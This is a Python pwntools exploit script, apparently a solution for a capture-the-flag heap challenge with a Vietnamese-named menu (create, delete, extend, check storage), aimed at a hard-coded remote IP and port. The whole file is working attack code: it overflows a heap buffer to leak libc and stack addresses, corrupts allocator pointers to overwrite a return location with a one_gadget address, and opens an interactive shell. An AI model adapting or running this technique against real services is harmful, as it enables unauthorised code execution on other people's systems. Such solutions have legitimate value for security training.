#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x0000000000401675
                b* create
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('103.130.219.236', 5002)
else:
        p = process(exe.path)

GDB()
def taokho(pos, des):
    sla(b"> ", b"1")
    sla(b"> ", str(pos).encode())
    sla(b"> ", des)
def xoakho(pos):
    sla(b"> ", b"2")
    sla(b"> ", str(pos).encode())
def morong(pos, size, des):
    sla(b"> ", b"3")
    sla(b"> ", str(pos).encode())
    sla(b"> ", str(size).encode())
    s(des)
def kiemtra(pos):
    sla(b"> ", b"4")
    sla(b"> ", str(pos).encode())
    
taokho(0, b"0" * 6)

morong(0, 0x500, b"a" * 0x500)
taokho(2, b"0" * 6)
kiemtra(2)

leak_libc = u64(p.recv(8))
libc.address = leak_libc - 0x1ed000
leak = p.recv(0x1000)
leak = p.recv(0x1000)
leak = p.recv(0x400)
leak = p.recv(0x1e0)
leak = p.recv(18)
leak = p.recv(8)

p.recvuntil(b"Kiem tra kho")
stack = u64(leak)
info("stack: " + hex(stack))
info("leak libc: " + hex(leak_libc))
info("libc base: " + hex(libc.address))
xoakho(0)

taokho(0, b'0' * 6)
morong(0, 8, b"a" * 8)
taokho(1, b'1'*6)
xoakho(0)
xoakho(1)
taokho(0, b'1' * 6)
taokho(1, b'1' * 6)

morong(1, 0x8, p64(0))
morong(0, 0x8, p64(stack-0x120))
morong(1, 0x8, p64(libc.address+0xe3b01))


p.interactive()


